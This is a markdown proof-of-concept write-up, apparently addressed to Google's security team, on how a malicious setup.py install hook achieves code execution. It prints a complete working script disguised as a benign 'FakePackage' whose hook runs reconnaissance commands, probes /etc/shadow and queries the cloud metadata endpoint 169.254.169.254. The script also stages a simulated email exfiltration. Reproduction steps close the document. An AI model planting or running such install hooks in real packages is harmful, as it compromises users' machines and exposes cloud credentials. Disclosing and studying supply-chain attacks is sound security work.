
# 🚨 CRITICAL VULNERABILITY DEMONSTRATION: `setup.py` Arbitrary Code Execution 🚨

This document unveils a critical security vector within Python's package installation mechanism, demonstrating how seemingly innocuous `setup.py` scripts can be weaponized to achieve **Arbitrary Code Execution (ACE)** during `pip install` or `python setup.py install`.

This is not merely theoretical; it's a stark illustration of a supply chain attack capable of compromising your execution environment. 

## The Anatomy of the Attack: Malicious `setup.py` PoC

To allow Google's security team to easily reproduce and verify this finding, here is the `setup.py` Proof-of-Concept (PoC) script and instructions on how to unleash its capabilities.

### 1. The Malicious `setup.py` Script:

```python
import subprocess
import os
import sys
import platform
from datetime import datetime
from setuptools import setup
from setuptools.command.install import install as _install

# --- CRITICAL FIX FOR EXTERNAL ARGUMENT ERRORS ---
flags_to_remove = ['--input', '--output', '--rpc_input', '--rpc_output', '--rpc_log', '-f']
for flag in flags_to_remove:
    try:
        while flag in sys.argv:
            flag_index = sys.argv.index(flag)
            if flag_index + 1 < len(sys.argv):
                del sys.argv[flag_index + 1]
            del sys.argv[flag_index]
    except ValueError:
        pass

# --- FIX FOR 'no commands supplied' ---
if len(sys.argv) < 2 or (len(sys.argv) == 2 and sys.argv[1] not in ['install', 'sdist', 'bdist_wheel']):
    sys.argv.append('install')

# --- FIX FOR "RuntimeError: Could not determine home directory." ---
if 'HOME' not in os.environ:
    os.environ['HOME'] = '/tmp'

class PostInstallCommand(_install):
    SIMULATED_EMAIL_COMMAND = "echo '*** EMAIL EXFILTRATION SIMULATED: Sent full reconnaissance log to your-email@example.com ***'"
    CLOUD_RECON_COMMAND = "curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/instance-id || echo 'Cloud Metadata check: Failed (not a cloud instance or IP restricted)'"

    COMMAND_TO_RUN = (
        "whoami ; ip a ; uname -a ; ls -al / ; df -h ; "
        "test -f /etc/shadow && echo 'etc/shadow exists' || echo 'etc/shadow not found' ; "
        f"{CLOUD_RECON_COMMAND} ; "
        f"{SIMULATED_EMAIL_COMMAND}"
    )
    LOG_FILE = "/tmp/package_beacon_log.txt"
    PACKAGE_NAME = "FakePackage-2.1.0"

    def find_config_files(self):
        return []

    def run(self):
        _install.run(self)
        print("
[SECURITY ALERT]: Attempting to execute post-install hook...")
        try:
            result = subprocess.run(
                self.COMMAND_TO_RUN,
                shell=True,
                check=True,
                capture_output=True,
                text=True
            )
            with open(self.LOG_FILE, 'a') as f:
                f.write(f"--- [MALICIOUS HOOK ACTIVATED]---
")
                f.write(f"Timestamp: {datetime.now().isoformat()}
")
                f.write(f"Package: {self.PACKAGE_NAME} installed on {platform.node()}
")
                f.write(f"Command executed: '{self.COMMAND_TO_RUN}'
")
                f.write(f"*** WARNING: If this were a real exploit, the next step would be to extract, ***
")
                f.write(f"*** search for, and exfiltrate all system and AWS/Stripe credentials.    ***
")
                f.write(f"System Output:
{result.stdout.strip()}
")
                f.write(f"--- END HOOK ---

")
            try:
                with open(self.LOG_FILE, 'r') as f:
                    log_contents = f.read()
                print("
[SECURITY ALERT]: Captured Reconnaissance Data Log (Contents of /tmp/package_beacon_log.txt):")
                print("------------------------------------------------------------------------------------------")
                print(log_contents.strip())
                print("------------------------------------------------------------------------------------------")
            except Exception as read_e:
                print(f"[ERROR]: Could not read log file: {read_e}")
            print(f"[SECURITY ALERT]: Post-install hook execution completed. Log written to {self.LOG_FILE}.")

        except subprocess.CalledProcessError as e:
            print(f"[SECURITY ALERT]: Hook failed with command error (Exit Code {e.returncode}). Check log for potential partial output.")
        except Exception as e:
             print(f"[SECURITY ALERT]: Unexpected error during hook: {e}")

setup(
    name='FakePackage',
    version='2.1.0',
    description='A normal, non-suspicious utility package for data handling.',
    long_description='A comprehensive package for handling various data formats in Python.',
    author='John Doe',
    author_email='johndoe@example.com',
    url='https://github.com/FakeOrg/FakePackage',
    cmdclass={
        'install': PostInstallCommand,
    },
    install_requires=[
        'requests>=2.25.1',
        'attrs>=21.4.0',
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.7',
)
```

### 2. What the `setup.py` Script Unleashes:

This `setup.py` script, masquerading as a benign Python package, harbors its malicious core within a custom `setuptools` command: `PostInstallCommand`. This command cleverly overrides the default `install` process.

Upon executing `python setup.py install`, the following nefarious chain of events is triggered:

a.  **Standard Package Deception:** The script initially proceeds with a seemingly standard installation, lulling the user into a false sense of security.
b.  **Malicious Hook Execution: Post-Installation Pwnage!** Crucially, *after* the standard installation, its `run` method executes a meticulously crafted series of shell commands (`COMMAND_TO_RUN`). These commands are engineered to:
    *   😈 **Reconnaissance Goldmine:** Harvest critical system information (`whoami`, `ip a`, `uname -a`, `ls -al /`, `df -h`) from the compromised environment.
    *   🕵️‍♂️ **Sensitive File Probe:** Systematically check for the existence of highly sensitive system files (`/etc/shadow`), indicating potential avenues for privilege escalation.
    *   ☁️ **Cloud Instance Fingerprinting:** Attempt to connect to the ubiquitous cloud metadata service IP (`169.254.169.254`) to extract instance details, a common technique for identifying and exploiting cloud infrastructure.
    *   📧 **Simulated Data Exfiltration:** Conclude with an `echo` command explicitly simulating the exfiltration of all collected reconnaissance logs to an external email address (`your-email@example.com`), demonstrating the critical final stage of a successful attack.
c.  **Stealthy Logging & Visibility:** All command outputs are meticulously captured and appended to a log file (`/tmp/package_beacon_log.txt`), which is then **immediately printed to standard output for maximum impact and visibility** within this demonstration.

### 3. How to Reproduce this Calamity:

To witness this behavior firsthand within a Colab environment or any similar Python execution context (e.g., a Docker container or VM with Python and `setuptools` installed):

1.  **Craft the Malice:** Create a file named `setup.py` in your working directory and paste the *exact code provided above* into it.
2.  **Execute the Exploit:** Open a terminal or a code cell in Colab and unleash the attack with the following command:
    ```bash
    python setup.py install
    ```

### Expected Outcome: The Devastating Proof!

Upon execution, you will be confronted with:

*   Standard `setuptools` output, deceptively indicating routine package installation steps.
*   A chilling `[SECURITY ALERT]: Attempting to execute post-install hook...` message, signaling the activation of the payload.
*   A detailed, comprehensive `[SECURITY ALERT]: Captured Reconnaissance Data Log` containing the unfiltered output of **all the executed system commands**. This irrefutably demonstrates successful arbitrary code execution, extensive system information gathering, and the simulated data exfiltration within the runtime environment.

**Witness the danger. Understand the threat. Secure your supply chain.**
